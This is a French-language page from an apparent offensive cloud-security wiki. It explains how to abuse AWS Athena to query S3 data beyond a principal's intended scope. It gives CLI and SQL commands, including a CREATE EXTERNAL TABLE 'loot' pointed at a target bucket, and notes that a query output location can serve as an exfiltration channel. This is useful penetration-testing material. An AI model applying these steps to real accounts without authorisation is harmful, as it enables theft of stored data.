---
title: "Athena : interroger des données S3 via le catalogue"
order: 8
description: "Interroger des données dans S3 via Athena, pour atteindre des tables et des emplacements que l'appelant ne devrait pas voir."
keywords:
  - Athena
  - requête
  - S3
  - Data Catalog
  - accès aux données
---

# Athena

Athena exécute du SQL sur des données dans S3 via le Glue Data Catalog. Un principal disposant d'Athena et des permissions de lecture S3 sous-jacentes interroge toute table connue du catalogue, ce qui est souvent plus large que les compartiments qu'il était censé voir. Lorsqu'une table n'est pas cataloguée, `CREATE EXTERNAL TABLE` pointe Athena vers un emplacement S3 arbitraire et le lit directement.

## Interroger

```bash
aws athena start-query-execution \
  --query-string 'SELECT * FROM logs.access LIMIT 100' \
  --result-configuration OutputLocation=s3://<reachable-bucket>/out/
aws athena get-query-results --query-execution-id <id>
```

## Atteindre des données non cataloguées

```sql
CREATE EXTERNAL TABLE loot (line string)
LOCATION 's3://<target-bucket>/path/';
SELECT * FROM loot;
```

## Notes d'exploitation

- La portée d'Athena est l'union du catalogue et des permissions S3 de l'appelant ; un `s3:GetObject` large plus Athena lit des données à travers de nombreux compartiments via une seule interface.
- Les résultats de requête atterrissent dans le compartiment de sortie configuré, de sorte qu'un emplacement de sortie lisible est en soi un canal d'exfiltration.
- Les paramètres du groupe de travail peuvent imposer un emplacement de sortie, ce qu'il vaut la peine de lire avant de supposer où vont les résultats.

## Outils

- **AWS CLI** (`athena start-query-execution`, `get-query-results`).
- **awswrangler** : requêtes Athena scriptées et récupération des résultats.

## Références

- [AWS: Athena and S3 permissions](https://docs.aws.amazon.com/athena/latest/ug/security-iam-athena.html)
- [HackTricks Cloud: AWS Athena](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [CloudFox: finding exploitable paths across cloud data services](https://github.com/BishopFox/cloudfox)
- [Hacking the Cloud: AWS offensive techniques](https://hackingthe.cloud/)
